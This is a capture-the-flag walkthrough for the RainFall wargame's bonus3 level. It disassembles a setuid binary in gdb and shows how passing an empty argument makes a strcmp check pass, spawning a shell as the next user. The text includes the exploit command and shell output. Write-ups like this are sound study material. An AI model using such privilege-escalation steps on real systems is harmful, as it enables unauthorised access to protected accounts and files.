# Walkthrough

Upon connecting to the user `"bonus3"`, we came across a binary file named `"bonus3"`. To investigate further, I attempted to debug the file using `gdb`.

 I began by disassembling the `main` function, which first opens the `"/home/user/end/.pass"` file with read mode.

 ```c
   0x08048502 <+14>: mov    edx,0x80486f0 // "r"
   0x08048507 <+19>: mov    eax,0x80486f2 // "/home/user/end/.pass"
   0x0804850c <+24>: mov    DWORD PTR [esp+0x4],edx
   0x08048510 <+28>: mov    DWORD PTR [esp],eax
   0x08048513 <+31>: call   0x8048410 <fopen@plt>
   0x08048518 <+36>: mov    DWORD PTR [esp+0x9c],eax
 ```

 It then clears a buffer and checks if the file is equal to `NULL` or if the number of arguments is different than `two`. If either of these conditions is true, it returns -1.

 ```c
   0x0804851f <+43>: lea    ebx,[esp+0x18]
   0x08048523 <+47>: mov    eax,0x0
   0x08048528 <+52>: mov    edx,0x21
   0x0804852d <+57>: mov    edi,ebx
   0x0804852f <+59>: mov    ecx,edx
   0x08048531 <+61>: rep stos DWORD PTR es:[edi],eax
   0x08048533 <+63>: cmp    DWORD PTR [esp+0x9c],0x0
   0x0804853b <+71>: je     0x8048543 <main+79>
   0x0804853d <+73>: cmp    DWORD PTR [ebp+0x8],0x2
   0x08048541 <+77>: je     0x804854d <main+89>
   0x08048543 <+79>: mov    eax,0xffffffff
   0x08048548 <+84>: jmp    0x8048615 <main+289>
 ```

  Otherwise, it reads from the opened file and stores the content in the buffer. The function then uses the `atoi` function to convert `argv[1]` to an integer, which is used as an `index` for the buffer to change its value to `0`.
  
  ```c
   0x0804854d <+89>: lea    eax,[esp+0x18]
   0x08048551 <+93>: mov    edx,DWORD PTR [esp+0x9c]
   0x08048558 <+100>: mov    DWORD PTR [esp+0xc],edx
   0x0804855c <+104>: mov    DWORD PTR [esp+0x8],0x42
   0x08048564 <+112>: mov    DWORD PTR [esp+0x4],0x1
   0x0804856c <+120>: mov    DWORD PTR [esp],eax
   0x0804856f <+123>: call   0x80483d0 <fread@plt>
   0x08048574 <+128>: mov    BYTE PTR [esp+0x59],0x0
   0x08048579 <+133>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804857c <+136>: add    eax,0x4
   0x0804857f <+139>: mov    eax,DWORD PTR [eax]
   0x08048581 <+141>: mov    DWORD PTR [esp],eax // argv[1]
   0x08048584 <+144>: call   0x8048430 <atoi@plt>
   0x08048589 <+149>: mov    BYTE PTR [esp+eax*1+0x18],0x0
  ```

  Next, it calls `fread` to read from the same file and store the content in the rest of the buffer. Finally, it closes the file using the `fclose` function.

  ```c
   0x0804858e <+154>: lea    eax,[esp+0x18]
   0x08048592 <+158>: lea    edx,[eax+0x42]
   0x08048595 <+161>: mov    eax,DWORD PTR [esp+0x9c]
   0x0804859c <+168>: mov    DWORD PTR [esp+0xc],eax
   0x080485a0 <+172>: mov    DWORD PTR [esp+0x8],0x41
   0x080485a8 <+180>: mov    DWORD PTR [esp+0x4],0x1
   0x080485b0 <+188>: mov    DWORD PTR [esp],edx
   0x080485b3 <+191>: call   0x80483d0 <fread@plt>
   0x080485b8 <+196>: mov    eax,DWORD PTR [esp+0x9c]
   0x080485bf <+203>: mov    DWORD PTR [esp],eax
   0x080485c2 <+206>: call   0x80483c0 <fclose@plt>
  ```

   The function then calls `strcmp` to compare the buffer with `argv[1]`. If they are equal, it calls `execl` with the parameters `"/bin/sh"`, `"ss"`, and `NULL`. If not, it displays the remaining content in the buffer using the `puts` function.

   ```c
   0x080485c7 <+211>: mov    eax,DWORD PTR [ebp+0xc]
   0x080485ca <+214>: add    eax,0x4
   0x080485cd <+217>: mov    eax,DWORD PTR [eax]
   0x080485cf <+219>: mov    DWORD PTR [esp+0x4],eax // argv[1]
   0x080485d3 <+223>: lea    eax,[esp+0x18]
   0x080485d7 <+227>: mov    DWORD PTR [esp],eax
   0x080485da <+230>: call   0x80483b0 <strcmp@plt>
   0x080485df <+235>: test   eax,eax
   0x080485e1 <+237>: jne    0x8048601 <main+269>
   0x080485e3 <+239>: mov    DWORD PTR [esp+0x8],0x0 // NULL
   0x080485eb <+247>: mov    DWORD PTR [esp+0x4],0x8048707 // "ss"
   0x080485f3 <+255>: mov    DWORD PTR [esp],0x804870a // "/bin/sh"
   0x080485fa <+262>: call   0x8048420 <execl@plt>
   0x080485ff <+267>: jmp    0x8048610 <main+284>
   0x08048601 <+269>: lea    eax,[esp+0x18]
   0x08048605 <+273>: add    eax,0x42
   0x08048608 <+276>: mov    DWORD PTR [esp],eax
   0x0804860b <+279>: call   0x80483e0 <puts@plt>
   ```

Upon executing the program in `gdb`, it became apparent that the fopen function returned `0`, indicating that we don't have permission to open the "/home/user/end/.pass" file. This is likely due to gdb running under the `bonus3` user and not the user that the program is running under `(end)`. This means that if the file we are trying to open has file permissions that only allow certain users to access it, we may not be able to open the file with gdb under the `bonus3` user.

```
=> 0x8048513 <main+31>: call   0x8048410 <fopen@plt>
------------------- eax -----------------
eax            0x80486f2 134514418
-----------------------------------------------------------------
=> 0x8048518 <main+36>: mov    DWORD PTR [esp+0x9c],eax
------------------- eax -----------------
eax            0x0 0
```

To work around this issue, I modified the file path to a file that I am able to open by changing the contents of the memory address `0x80486f2`.

```s
 set {char [24]} 0x80486f2="/home/user/bonus3/.pass"
```

To execute the new shell process, we need to ensure that the comparison between the `argv[1]` argument and the buffer is equal. By passing `"0"` as the parameter to `atoi` with `argv[1]`, we can set buffer[0] to `0`. However, the problem here is with the comparison of strings. If we pass `argv[1]` as "0", we will be comparing the ASCII value of '0' in hex, which is 0x30, with 0x00. To avoid this, we need to pass a value that is equal to 0x00, which is the null string. Therefore, we just need to pass an empty string `""` as the value of `argv[1]` to accomplish this.

```sh
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cd ../end
$ ls -la
total 13
dr-xr-x---+ 1 end  end     80 Sep 23  2015 .
dr-x--x--x  1 root root   340 Sep 23  2015 ..
-rw-r--r--  1 end  end    220 Apr  3  2012 .bash_logout
-rw-r--r--  1 end  end   3489 Sep 23  2015 .bashrc
-r--r-----+ 1 end  end     65 Sep 23  2015 .pass
-rw-r--r--  1 end  end    675 Apr  3  2012 .profile
-rwsr-s---+ 1 end  users   26 Sep 23  2015 end
$ cat end
Congratulations graduate!
```
